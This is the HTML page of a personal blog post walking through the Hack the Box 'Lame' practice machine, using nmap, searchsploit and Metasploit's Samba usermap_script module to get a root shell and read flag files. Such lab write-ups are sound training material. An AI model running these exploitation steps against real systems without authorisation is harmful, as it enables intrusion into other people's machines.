@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>Lame Machine Walkthrough - s0merset7&#39;s Blog</title>
+<meta name="description" content="Step-by-step walkthrough of the Hack the Box Lame Machine.">
+
+<meta name="author" content="s0merset7"><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "s0merset7\u0027s Blog",
+    
+    "url": "https:\/\/s0merset7.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/s0merset7.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/s0merset7.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/s0merset7.github.io\/post\/2020\/aug\/lame_machine\/",
+          "name": "Lame machine walkthrough"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "s0merset7"
+  },
+  "headline": "Lame Machine Walkthrough",
+  "description" : "Step-by-step walkthrough of the Hack the Box Lame Machine.",
+  "inLanguage" : "en",
+  "wordCount":  850 ,
+  "datePublished" : "2020-08-24T00:00:00",
+  "dateModified" : "2020-08-24T00:00:00",
+  "image" : "https:\/\/s0merset7.github.io\/",
+  "keywords" : [ "HacktheBox, Walkthrough" ],
+  "mainEntityOfPage" : "https:\/\/s0merset7.github.io\/post\/2020\/aug\/lame_machine\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/s0merset7.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/s0merset7.github.io\/",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:image" content="https://s0merset7.github.io/posts/Lame_Machine.png">
+<meta property="og:url" content="https://s0merset7.github.io/post/2020/aug/lame_machine/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="s0merset7&#39;s Blog">
+   
+<link rel="apple-touch-icon" sizes="180x180" href=" https://s0merset7.github.io/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://s0merset7.github.io/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://s0merset7.github.io/favicon/favicon-16x16.png">
+
+
+<meta name="generator" content="Hugo 0.111.3"><link rel="alternate" href="https://s0merset7.github.io/index.xml" type="application/rss+xml" title="s0merset7&#39;s Blog">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+<link rel="stylesheet" href="https://s0merset7.github.io/css/main.css">
+<link disabled id="dark-mode-theme" rel="stylesheet" href="https://s0merset7.github.io/css/dark.css">
+<link rel="stylesheet" href="https://s0merset7.github.io/css/highlight.min.css"><link rel="stylesheet" href="https://s0merset7.github.io/css/codeblock.css">
+
+
+
+
+  </head>
+  <body>
+    
+<div class="container fixed-top">
+  <div class="row justify-content-center">
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+
+      <nav class="navbar navbar-expand-lg navbar-light fixed-top p-0">
+        <div class="container">
+          
+          <a class="navbar-brand fw-bold" href="https://s0merset7.github.io/">s0merset7&#39;s Blog</a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+
+          <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+            <ul class="navbar-nav mb-2 mb-lg-0">
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="Home"
+                  href="/"> Home</a>
+              </li>
+
+              
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="Tags"
+                  href="/tags/"> Tags</a>
+              </li>
+
+              
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="About"
+                  href="/about/"> About</a>
+              </li>
+
+              
+              
+
+              
+              <li class="nav-item nav-link">
+                <a id="dark-mode-toggle" class="bi bi-sun"></a>
+              </li>
+              
+            </ul>
+          </div>
+        </div>
+      </nav>
+
+    </div>
+  </div>
+</div>
+    
+
+
+
+
+
+
+
+
+
+<header class="header-section ">
+
+  <div class="intro-header no-img mt-10">
+    <div class="container">
+      <div class="row justify-content-center">
+        
+        <div class="col-sm-12 col-md-12 col-lg-8 col-xl-8">
+          
+
+          
+          <div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
+            
+
+            <div class="post-heading">
+              
+
+              
+
+              
+              <h1 class="fw-semibold display-5 lh-1 mb-3"> 
+                Lame Machine Walkthrough
+                
+              </h1>
+              
+              
+
+              
+
+              
+              
+              <span class="post-meta">
+  
+  
+  &nbsp;August 24, 2020 
+
+  
+
+  
+  
+  
+</span>
+
+
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 ">
+
+      <div class="card-image card-image-blog p-0">
+        
+        <img src="/posts/Lame_Machine.png" alt="Lame Machine Walkthrough" class="card-img-bottom img-fluid">
+        
+        
+      </div>
+    </div>
+ 
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+      <article role="main" class="blog-post">
+        <ol>
+<li>In a new terminal window, run <code>nmap -sV -O -F --version-light 10.10.10.3</code></li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726880-9b4c8980-d9d4-11ea-9c66-4269c021413f.png" alt="Image"></p>
+<ul>
+<li>Another option is to open <strong>Zenmap</strong> and run a port scan on the same IP (to see just the information on the ports, you can go to the <strong>Ports/Hosts</strong> tab)
+<ul>
+<li><strong>Zenmap</strong> is a program that does a really good job at visualizing and breaking down <code>nmap</code> commands into digestible bites</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726888-b7502b00-d9d4-11ea-9a64-1e5bd559f122.png" alt="Image">
+<img src="https://user-images.githubusercontent.com/44144070/89726889-b8815800-d9d4-11ea-8bab-4a7be888eae5.png" alt="Image"></p>
+<ol start="2">
+<li>Now there a a LOT of different ways to use <code>nmap</code>, and being that I&rsquo;m still learning you are going to be seeing a lot of different versions, but I will do my best to explain what each version does. The two versions used here I got from other tutorials and show different levels of detail when port scanning.
+<ul>
+<li>The first version we used was <code>nmap -sV -O -F --version-light 10.10.10.3</code>
+<ul>
+<li><code>-sV</code>: Probes open ports to determine service/version info</li>
+<li><code>-O</code>: Enable OS detection</li>
+<li><code>-F</code>: Fast mode, scans fewer ports than the default scan</li>
+<li><code>--version-light</code>: Limit to most likely probes</li>
+</ul>
+</li>
+<li>The second version used (as seen in <strong>Zenmap</strong>)
+<ul>
+<li><code>-A</code>: Enable OS detection, version detection, script scanning, and traceroute</li>
+<li><code>-v</code>: Increase verbosity level (how detailed the process and results are)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>You’ll find that there are 4 available ports with different services running on them (21, 22, 139, 445)</li>
+<li>Port 21 shows <strong>vsftpd 2.3.4</strong>, let’s check if there are any known vulnerabilities</li>
+<li>Run command <code>searchsploit vsftpd 2.3.4</code>
+<ul>
+<li>What this does is search for any <a href="https://cve.mitre.org/about/index.html">Common Vulnerability and Exploits (CVE)</a> and returns the name and location of the exploit in Kali</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726895-be773900-d9d4-11ea-8b21-a2ea0eb85645.png" alt="Image"></p>
+<ol start="6">
+<li>You&rsquo;ll see that there is one vulnerability, a <em>&ldquo;Backdoor Command Execution&rdquo;</em></li>
+<li>We can try and use this vulnerability with <strong>Metasploit</strong>
+<ul>
+<li><strong>Metasploit</strong> is a very nifty software that has a bunch of CVE exploits saved that can be run automatically</li>
+</ul>
+</li>
+<li>Open <strong>Metasploit</strong> and use the command <code>search vsftpd 2.3.4</code></li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726896-bfa86600-d9d4-11ea-9c96-eed449fe639d.png" alt="Image"></p>
+<ol start="9">
+<li>You&rsquo;ll see 4 different options, and the fourth one will be our <em>&ldquo;Backdoor Command Execution&rdquo;</em> exploit</li>
+<li>Copy the address and run <code>use exploit/unix/ftp/vsftpd_234_backdoor</code></li>
+<li>Type <code>show options</code> and we&rsquo;ll see that we need to set <strong>RHOSTS</strong> to the desired IP</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726897-c040fc80-d9d4-11ea-8180-bbc1cf91524f.png" alt="Image"></p>
+<ol start="12">
+<li>Do <code>set rhost 10.10.10.3</code></li>
+<li>If we do <code>show options</code> again, then we&rsquo;ll see its set and can type <code>run</code>
+<ul>
+<li>What this does is tell <strong>Metalsploit</strong> where to direct the exploit</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726898-c0d99300-d9d4-11ea-85af-1a4a549e7948.png" alt="Image"></p>
+<ol start="14">
+<li>After a little bit, we&rsquo;ll get a message saying, <em>“Exploit completed, but no session was created”</em>,    meaning that the exploit was attempted but didn’t&rsquo; work (if we do some <a href="https://www.exploit-db.com/exploits/17491">research</a>, it turns out that this exploit had since been fixed which is why our attempt failed)</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726899-c1722980-d9d4-11ea-95b4-e9fb64ffb433.png" alt="Image"></p>
+<ol start="15">
+<li>Let&rsquo;s continue to check the other option on port 139, <strong>Samba</strong></li>
+<li>Run <code>search Samba 3.0.20</code> (which we know from our port scan) and we see two results.</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726900-c20ac000-d9d4-11ea-9099-911a217b2ce9.png" alt="Image"></p>
+<ol start="17">
+<li>We&rsquo;re going to want to focus on the first result, <em>&quot;&lsquo;Username map script&rsquo; Command Execution&quot;</em></li>
+<li>We search that vulnerability in <strong>Metasploit</strong> with <code>searchsploit Samba 3.0.20</code></li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726901-c20ac000-d9d4-11ea-85e7-e2c36f8375e4.png" alt="Image"></p>
+<ol start="19">
+<li>We got a lot more options this time, but if we scroll through we see that option 15 is our <em>&ldquo;username map script&rdquo; Command Execution</em> vulnerability and copy the address and run <code>use exploit/multi/samba/usermap_script</code></li>
+<li>Again we look at the settings and change the <strong>RHOSTS</strong> to our IP with show options and <code>set rhost 10.10.10.3</code> and then we&rsquo;re good to <code>run</code></li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726902-c2a35680-d9d4-11ea-9203-f5b35506d1b9.png" alt="Image"></p>
+<ol start="21">
+<li>Chances are (unless you set it up before), you&rsquo;ll get the same message from when we ran the <strong>vsftpd 2.3.4 exploit</strong> <em>“Exploit completed, but no session was created”</em>, but if you run <code>show options</code> again, you&rsquo;ll see a new section</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726903-c2a35680-d9d4-11ea-90b9-85e20e6f1227.png" alt="Image"></p>
+<ol start="22">
+<li>Now we have an <strong>LHOST</strong> and <strong>LPORT</strong> section, but the natural <strong>LHOST</strong> is not what we want because HTB gives us our own local IP for when we are on its VPN. You can find yours in the <strong>Access</strong> settings on the HTB website</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726904-c33bed00-d9d4-11ea-9645-090c1b55201a.png" alt="Image"></p>
+<ol start="23">
+<li>Run <code>set lhost yourHtbIp</code> and then try <code>run</code> again</li>
+<li>You should see some new messages and after a few seconds one that says, <em>“Command shell session 1 opened”</em>, and we&rsquo;re in!</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726905-c33bed00-d9d4-11ea-8fbf-1b58f3e2a092.png" alt="Image"></p>
+<ol start="25">
+<li>Now that we have a shell, we can check what kind of privileges we have with <code>whoami</code></li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726906-c3d48380-d9d4-11ea-90be-560bf8e6e84f.png" alt="Image"></p>
+<ol start="26">
+<li>Turns out we are already in as the root user! Now all we need to do is find the password hashes under user.txt and root.txt</li>
+<li>From here we have the option of either digging around in all the files and directories for what we want, or we can use this command <code>find / -type f -name “nameOfFile”</code> where nameOfFile will be replaced with user.txt and root.txt
+<ul>
+<li>This command will return the file address of whatever file you put in place of <em>&ldquo;nameOfFile&rdquo;</em>. We know what to search for because HTB machines often store the user and root hashes in files named user.txt and root.txt</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/44144070/89726907-c3d48380-d9d4-11ea-9444-af9a860827a4.png" alt="Image"></p>
+<ol start="28">
+<li>Once we find the locations of the two files, we can just run <code>cat fileAddress</code> where fileAddress is what we got with the find command</li>
+<li>Take those hashes and submit them on your HTB account and get the points!</li>
+</ol>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/1">Official Lame Writeup from Hack the Box</a></li>
+<li><a href="https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/">Tutorial from freecodecamp.org</a></li>
+<li><a href="https://nmap.org/book/man-briefoptions.html"><code>nmap</code> Command Help</a></li>
+</ul>
+<h6 id="font-size1075-108-097-108-106-097-112-099-108-032-083-112-108-098-097-108-117-104-117-097-032-068-112-115-115-112-104-116-032-090-118-116-108-121-122-108-097font"><!-- raw HTML omitted -->075 108 097 108 106 097 112 099 108 032 083 112 108 098 097 108 117 104 117 097 032 068 112 115 115 112 104 116 032 090 118 116 108 121 122 108 097<!-- raw HTML omitted --></h6>
+
+      </article>
+    </div>
+  </div>
+
+  <div class="row">
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+      <hr />
+    </div>
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-2">
+        
+          <div class="blog-tags">
+            
+              <a href="https://s0merset7.github.io//tags/hackthebox/">HacktheBox</a>
+            
+              <a href="https://s0merset7.github.io//tags/walkthrough/">Walkthrough</a>
+            
+          </div>
+        
+      </div>
+ 
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+      
+      <section id="social-share">
+        <div class="list-inline footer-links">
+          
+
+<div class="share-box" aria-hidden="true">
+    <div>
+        <p class="list-inline footer-links">Please share using the links if you enjoyed!</p>
+    </div>
+    <ul class="share">
+
+        
+        <li>
+            <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fs0merset7.github.io%2fpost%2f2020%2faug%2flame_machine%2f" target="_blank" title="Share on Facebook">
+                <i class="bi bi-facebook facebook-color"></i>
+            </a>
+        </li>
+
+        
+        <li>
+            <a href="//twitter.com/share?url=https%3a%2f%2fs0merset7.github.io%2fpost%2f2020%2faug%2flame_machine%2f&amp;text=Lame%20Machine%20Walkthrough&amp;via=map%5bgithub%3as0merset7%20linkedin%3aryan-dinnan%20name%3as0merset7%20twitter%3as0merset7%5d" target="_blank" title="Share on Twitter">
+                <i class="bi bi-twitter twitter-color"></i>
+            </a>
+        </li>
+
+        
+        <li>
+            <a href="//reddit.com/submit?url=https%3a%2f%2fs0merset7.github.io%2fpost%2f2020%2faug%2flame_machine%2f&amp;title=Lame%20Machine%20Walkthrough" target="_blank" title="Share on Reddit">
+                <i class="bi bi-reddit reddit-color"></i>
+            </a>
+        </li>
+
+        
+        <li>
+            <a href="whatsapp://send?text=https%3a%2f%2fs0merset7.github.io%2fpost%2f2020%2faug%2flame_machine%2f&amp;description=Lame%20Machine%20Walkthrough" target="_blank" rel="noopener" title="Share on WhatsApp">
+                <i class="bi bi-whatsapp whatsapp-color"></i>
+            </a>
+        </li>
+
+
+        
+
+        
+
+        
+
+        
+        
+
+    </ul>
+</div>
+
+
+        </div>
+      </section>
+      
+    </div>
+
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 mt-3">
+      <div class="card">
+        <div class="row no-gutters">
+          <div class="col-md-2 "> 
+            <div class="card-body ">
+            <img src="/img/profilePic.png" class="img-responsive img-50 img-round" alt="">
+          </div>
+          </div>
+          <div class="col-md-10">
+            <div class="card-body p-1.1">
+
+              <p class="p-0 m-0"><small class="text-muted ">Written By</small></p>
+              <h5>
+                
+                
+                s0merset7
+                
+                
+              </h5>
+              <p class="card-text fs-1"></p>
+            </div>
+          </div>
+        </div>
+
+      
+    </div>
+  </div>
+
+      <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+        
+        <ul class="list-group list-group-horizontal" style="flex-direction: row">
+          
+          <li class="list-group-item b-0">
+
+            <a type="button" class="btn btn-dark" role="button" href="https://s0merset7.github.io/post/2020/aug/intro/"
+              data-toggle="tooltip" data-placement="top" title="Hack the Box Walkthroughs Intro">&larr;
+              Previous Post</a>
+          </li>
+          
+
+
+          
+          <li class="list-group-item ms-auto b-0">
+            <a type="button" class="btn btn-dark" role="button" href="https://s0merset7.github.io/post/2020/aug/jerry_machine/"
+              data-toggle="tooltip" data-placement="top" title="Jerry Machine Walkthrough">Next Post
+              &rarr;</a>
+          </li>
+          
+        </ul>
+        
+      </div>
+
+      <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4"> 
+      </div>
+    </div>
+  </div>
+
+  <div class="">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-12 col-md-12 mt-3">
+          <h3>Read more</h3>
+          <hr />
+        </div>
+
+        
+        
+        
+        
+
+        
+ 
+        
+        
+         
+        <div class="col-xl-4 col-lg-4 col-md-6 col-sm-6  mb-4">
+    <div class="card h-100 single-post-card shadow-effect bg-faded-light">
+        <a href="https://s0merset7.github.io/post/2020/aug/jerry_machine/">
+            <div class="card-body">
+
+                <h3 class="fw-bold post-title">Jerry Machine Walkthrough</h3>
+                
+
+                <p class="post-meta">
+                    <span class="post-meta">
+  
+  
+  &nbsp;August 24, 2020 
+
+  
+
+  
+  
+  
+</span>
+
+
+                </p>
+                
+                <div class="post-entry">
+
+                    
+                    Step-by-step walkthrough of the Hack the Box Jerry Machine.
+
+                    
+                </div>
+
+                <div class="read-more-section">
+                    <h6>Read more</h6>
+                </div>
+            </div>
+
+            
+            <img src="/posts/Jerry_Machine.png" alt="Jerry Machine Walkthrough" class="card-img-top img-fluid">
+            
+            
+        </a>
+    </div>
+</div> 
+        
+         
+        <div class="col-xl-4 col-lg-4 col-md-6 col-sm-6  mb-4">
+    <div class="card h-100 single-post-card shadow-effect bg-faded-light">
+        <a href="https://s0merset7.github.io/post/2020/aug/intro/">
+            <div class="card-body">
+
+                <h3 class="fw-bold post-title">Hack the Box Walkthroughs Intro</h3>
+                
+
+                <p class="post-meta">
+                    <span class="post-meta">
+  
+  
+  &nbsp;August 23, 2020 
+
+  
+
+  
+  
+  
+</span>
+
+
+                </p>
+                
+                <div class="post-entry">
+
+                    
+                    Introduction into the site and what&#39;s to come.
+
+                    
+                </div>
+
+                <div class="read-more-section">
+                    <h6>Read more</h6>
+                </div>
+            </div>
+
+            
+            <img src="/posts/intro.png" alt="Hack the Box Walkthroughs Intro" class="card-img-top img-fluid">
+            
+            
+        </a>
+    </div>
+</div> 
+         
+
+        
+        
+      </div>
+    </div>
+
+    
+
+  </div>
+</div>
+</div>
+
+    
+
+
+<footer>
+
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <ul
+          class="list-inline list-group list-group-horizontal text-center footer-links d-flex justify-content-center flex-row">
+
+          
+          <li>
+            <a href="https://github.com/s0merset7" title="GitHub" target="_blank">
+              <span class="mx-2">
+                <i class="bi bi-github"></i>
+              </span>
+            </a>
+          </li>
+          <li>
+            <a href="https://twitter.com/s0merset7" title="Twitter" target="_blank">
+              <span class="mx-2">
+                <i class="bi bi-twitter"></i>
+              </span>
+            </a>
+          </li>
+          <li>
+            <a href="https://linkedin.com/in/ryan-dinnan" title="LinkedIn" target="_blank">
+              <span class="mx-2">
+                <i class="bi bi-linkedin"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="col-md-12">
+        <p class="credits copyright text-muted">
+          
+          
+          s0merset7
+          
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+          2022
+          
+
+          
+          &nbsp;&bull;&nbsp;
+          <a href="https://s0merset7.github.io/">s0merset7&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          Powered by <a href="https://gohugo.io">Hugo</a> & <a href="https://github.com/binokochumolvarghese/lightbi-hugo">Lightbi.</a>&nbsp; Made with ❤ by <a href="https://binovarghese.com">Bino</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha256-tG5mcZUtJsZvyKAxYLVXrmjKBVLd6VpVccqz/r4ypFE=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.min.js" integrity="sha384-Y4oOpwW3duJdCWv5ly8SCFYWqFDsfob/3GkgExXKV4idmbt98QcxXYs9UoXAB7BZ" crossorigin="anonymous"></script>
+<script src="https://s0merset7.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function () { $("pre.chroma").css("padding", "0"); }); </script><script src="https://s0merset7.github.io/js/dark-mode.js"></script>
+    
+  </body>
+</html>
+
